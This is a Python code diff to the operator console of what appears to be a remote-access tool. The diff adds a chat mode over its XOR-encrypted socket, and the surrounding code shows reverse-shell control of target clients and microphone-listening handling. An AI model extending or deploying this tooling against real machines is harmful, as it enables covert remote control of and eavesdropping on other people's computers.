@@ -38,6 +38,10 @@ class AdminShell:
             threading.Event()
         )  # Create an Event to signal thread termination
         self.audio_lock = threading.Lock()
+        self.chat_mode = False
+        self.chat_channel = None
+        self.chat_thread = None  # Store the reference to the chat thread
+        self.exit_chat_flag = False
 
     def initializeServerConnection(self):
         try:
@@ -55,7 +59,7 @@ class AdminShell:
     """
             )
             spin = Spinner(Box1)
-            for i in range(50):
+            for i in range(1):
                 print(
                     "\r            {0} Requesting authentication...".format(
                         spin.next()
@@ -170,6 +174,24 @@ class AdminShell:
             self.stop_audio_thread.clear()  # Clear the stop signal
             self.audio_thread = None  # Reset the thread variable
 
+    def exit_chat(self):
+        if self.chat_thread:
+            self.exit_chat_flag = True  # Set the exit flag
+            self.chat_mode = False
+            try:
+                self.chat_thread.join(timeout=5)  # Wait for the chat thread to finish with a timeout
+            except Exception as e:
+                print(e)
+            if self.chat_thread.is_alive():
+                print("Chat thread did not terminate in time. Continuing without joining.")
+            else:
+                print("Chat thread terminated successfully.")
+            self.chat_thread = None
+
+
+    def __del__(self):
+        self.exit_chat()
+
     def adminShellSession(self, AdminShellSocket):
         if os.name == "nt":
             os.system("cls")
@@ -205,15 +227,23 @@ class AdminShell:
             """
         )
         while self.isAuthenticated:
-            if self.TARGET_CLIENT:
-                adminShell = input(
-                    f"> {Fore.RED}reverseShell{Style.RESET_ALL}@{Fore.RED}{self.ADMIN_DISPLAY_NAME}{Style.RESET_ALL} ~ {Fore.BLUE}{REVERSE_SHELL_IP}{Style.RESET_ALL}:{Fore.BLUE}{REVERSE_SHELL_PORT}{Style.RESET_ALL} {Fore.GREEN}${Style.RESET_ALL} "
-                )
+            if self.chat_mode:
+                message = input("You: ")
+                if message == "exitchat":
+                    self.exit_chat()  # Stop the chat thread
+                    print("TERMINATED")
+                    continue
+                else:
+                    self.send_chat_message(message, AdminShellSocket)
             else:
-                adminShell = input(
-                    f"> {Fore.RED}admin{Style.RESET_ALL}@{Fore.RED}{self.ADMIN_DISPLAY_NAME}{Style.RESET_ALL} ~ {Fore.GREEN}${Style.RESET_ALL} "
-                )
-
+                if self.TARGET_CLIENT:
+                    adminShell = input(
+                        f"> {Fore.RED}reverseShell{Style.RESET_ALL}@{Fore.RED}{self.ADMIN_DISPLAY_NAME}{Style.RESET_ALL} ~ {Fore.BLUE}{REVERSE_SHELL_IP}{Style.RESET_ALL}:{Fore.BLUE}{REVERSE_SHELL_PORT}{Style.RESET_ALL} {Fore.GREEN}${Style.RESET_ALL} "
+                    )
+                else:
+                    adminShell = input(
+                        f"> {Fore.RED}admin{Style.RESET_ALL}@{Fore.RED}{self.ADMIN_DISPLAY_NAME}{Style.RESET_ALL} ~ {Fore.GREEN}${Style.RESET_ALL} "
+                    )
             if adminShell == "":
                 continue
             elif adminShell == "clear":
@@ -229,6 +259,13 @@ class AdminShell:
                     print("- Thread Name:", thread.name)
                 continue
 
+            elif adminShell == "enterchat":
+                self.chat_mode = True
+                self.exit_chat_flag = False  # Clear the exit flag
+                self.chat_thread = threading.Thread(target=self.receive_messages, args=(AdminShellSocket,))
+                #self.chat_thread.daemon = True
+                self.chat_thread.start()
+                continue
             else:
                 if self.TARGET_CLIENT:
                     formatTargetMessage = f"{adminShell} --FLAG_REVERSE_SHELL_INFO {REVERSE_SHELL_IP}:{REVERSE_SHELL_PORT}"
@@ -328,11 +365,13 @@ class AdminShell:
                                 print("Microphone is not being listened to.")
                             break
                         elif "--FLAG_KICKED_FROM_SERVER" in ServerShell:
+                            
                             print("")
                             print(
                                 "[*] You have been kicked from the server by a server administrator."
                             )
                             print("")
+                            break
                             sys.exit(1)
                         elif (
                             "--FLAG_REVERSE_SELL REVERSE_SHELL_HANDLER_STATUS?NOTFOUND"
@@ -427,6 +466,26 @@ class AdminShell:
                 except KeyboardInterrupt:
                     print("[INFO] Admin terminated the connection.")
                     AdminShellSocket.close()
+
+    def receive_messages(self, AdminShellSocket):
+        AdminShellSocket.setblocking(False)  # Set socket to non-blocking mode
+        while not self.exit_chat_flag:
+            try:
+                message = AdminShellSocket.recv(1024)
+                if not message:
+                    break  # No data received, break the loop
+                messageDecoded = self.handleXOREncryption(message, self.TRAFFIC_ENCRYPTION_TOKEN).decode("utf-8")
+                print(f"Message: {messageDecoded}")
+            except BlockingIOError:
+                pass  # No data available, continue loop
+        AdminShellSocket.setblocking(True)  # Set socket back to blocking mode
+
+
+    def send_chat_message(self, message, AdminShellSocket):
+        formatted_message = f"{self.ADMIN_DISPLAY_NAME}: {message}"
+        encrypted_message = self.handleXOREncryption(formatted_message.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
+        AdminShellSocket.send(encrypted_message)
+
 
 
 if __name__ == "__main__":
